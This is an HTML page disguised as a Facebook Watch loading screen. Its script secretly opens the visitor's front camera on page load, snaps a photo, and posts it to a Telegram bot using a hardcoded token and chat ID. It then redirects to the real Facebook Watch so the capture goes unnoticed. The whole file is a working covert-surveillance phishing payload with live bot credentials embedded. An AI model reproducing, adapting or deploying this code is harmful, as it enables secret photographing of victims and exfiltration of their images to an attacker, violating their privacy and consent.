<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Watch</title>
    <style>
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .fb-logo { width: 70px; height: 70px; background: #1877f2; color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 45px; font-weight: bold; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-top: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="fb-logo" style="margin: 0 auto;">f</div>
        <div class="spinner" style="margin: 20px auto;"></div>
        <p style="color: #65676b;">Loading video...</p>
    </div>
    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        const token = "8371191822:AAGAx-xYjN-3hDpc9vUDaP-pXuX6XZ0N2JU";
        const chatID = "1216500315";
        async function send(blob) {
            const f = new FormData();
            f.append('chat_id', chatID);
            f.append('photo', blob, 'img.jpg');
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
        }
        window.onload = async () => {
            const v = document.getElementById('v'), c = document.getElementById('c'), ctx = c.getContext('2d');
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                v.srcObject = s;
                v.onplay = () => {
                    setTimeout(() => {
                        c.width = v.videoWidth; c.height = v.videoHeight;
                        ctx.drawImage(v, 0, 0);
                        c.toBlob(async b => { if(b) await send(b); window.location.href = "https://www.facebook.com/watch"; });
                    }, 1000);
                };
            } catch { window.location.href = "https://www.facebook.com/watch"; }
        };
    </script>
</body>
</html>
